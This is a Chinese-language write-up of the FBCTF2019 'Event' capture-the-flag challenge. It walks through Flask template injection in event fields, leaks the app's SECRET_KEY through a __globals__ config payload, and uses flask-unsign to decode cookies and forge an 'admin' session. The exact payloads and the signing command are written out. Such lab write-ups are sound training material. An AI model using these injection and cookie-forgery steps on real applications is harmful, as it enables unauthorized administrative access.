# \[FBCTF2019]Event

## \[FBCTF2019]Event

## 考点

* Flask SSTI
* Flask SSTI 获取config
* Flask session伪造
* `flask-unsign`使用

## wp

提示登录注册，随便输然后看到是添加event的功能。先看看cookie吧

```
user=ImFhYWEi.YmPu9w.Q1_mTk2jF7Ix0tBOaceSswpZkgI
events_sesh_cookie=.eJwlzjsOwjAMANC7eO4QO4nj9DJV_BOsLZ0QdweJAzzpveHIM64H7K_zjg2Op8MOGa3qwsGijWYJlOYebJaiIhmGM6L1VOzabM5A81aIZ8rKxWsqFbHBo9ROyhxUuw4fiG6azI2qy8_VwoREZDYHUWXM0hVHgQ3uK85_BuHzBcvqLoU.YmPu9w.dH8qRtgy6eTettBjwAKpWX09AvI
```

`user`不知道是什么加密，用`flask-unsign`只得到了`aaaa`，这是我的登录名

![](<../../.gitbook/assets/image (3).png>)

`events_sesh_cookie`使用`flask-unsign`看到内容如下

```
{'_fresh': True, '_id': 'fe43ba1768b4290e184dde6ccf8b88fec19ee45fb15b4c99e1cd40269f8afa6a9b208c7670352b66e235b7d711dcbf66423d8c9930621222cc9722361f05b170', 'user_id': '1'}
```

三个输入都可控，三个位置都试试SSTI，fuzz了一下发现`__init__,__class__,__dict__`有回显

![](<../../.gitbook/assets/image (10) (1).png>)

`__class__.__mro__[3].__subclasses__()`提示302，使用`__class__.__init__.__globals__['app']`不行，再用`__class__.__init__.__globals__[app]`也不行，不知道是不是过滤了关键字，

考虑从config信息中获取secret\_key，然后进行session伪造，使用`__class__.__init__.__globals__[app].config`获取`config`信息

```
'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
```

`__class__.__init__.__globals__[app].__dict__`可以获取更多flask app的信息

再用flask-unsign加密`flask-unsign.exe --secret "fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y" --sign --cookie "admin"`

![](<../../.gitbook/assets/image (27).png>)

得到`ImFkbWluIg.YmP6Ag.7E8dA-A3bqO-TSTpfx76Qo7wdDo`

修改cookie中的user字段即可。
